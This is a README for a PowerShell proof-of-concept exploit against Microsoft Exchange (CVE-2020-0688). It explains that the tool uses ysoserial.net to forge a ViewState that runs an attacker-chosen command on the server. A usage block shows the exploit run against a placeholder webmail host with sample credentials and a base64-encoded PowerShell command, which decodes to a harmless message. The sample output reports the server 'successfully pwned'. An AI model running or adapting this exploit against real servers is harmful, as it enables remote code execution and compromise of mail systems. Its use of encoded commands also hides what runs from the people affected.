# PSForgot2kEyXCHANGE

PoC for Forgot2kEyXCHANGE (CVE-2020-0688) written in PowerShell

## Usage

This PoC requires a valid Username and Password.

This PoC uses [ysoserial.net](https://github.com/pwntester/ysoserial.net) to create the new ViewState which contains the command you specified on the -Command param.
If you don't already have this installed on your system download it [here](https://github.com/pwntester/ysoserial.net).

```PowerShell
PS> . .\PSForgot2kEyXCHANGE.ps1
PS> Invoke-Forgot2kEyXCHANG -Server 'https://webmail.domain.tld' -User 'Steve.McGreeve@domain.tld' -Password 'Summer2020!' -Command 'cmd /c powershell.exe -en dwByAGkAdABlAC0AaABvAHMAdAAgACcASQAnAG0AIABhACAAcwB0AGkAbgBrAHkAIABzAGsAaQBkACAAdwBoAG8AIAByAHUAbgBzACAAcgBhAG4AZABvAG0AIABjAG8AZABlACAAOgApACcA=' -YsoserialPath 'C:\tools\ysoserial.net\ysoserial.exe'
[+] Login successfully!
[+] Generated new ViewState successfully!
[+] Got a 500 response, successfully pwned https://webmail.domain.tld !
```

# Contributing

Feel free to open issues, contribute and submit your Pull Requests. You can also ping me on Twitter (@justin-p)
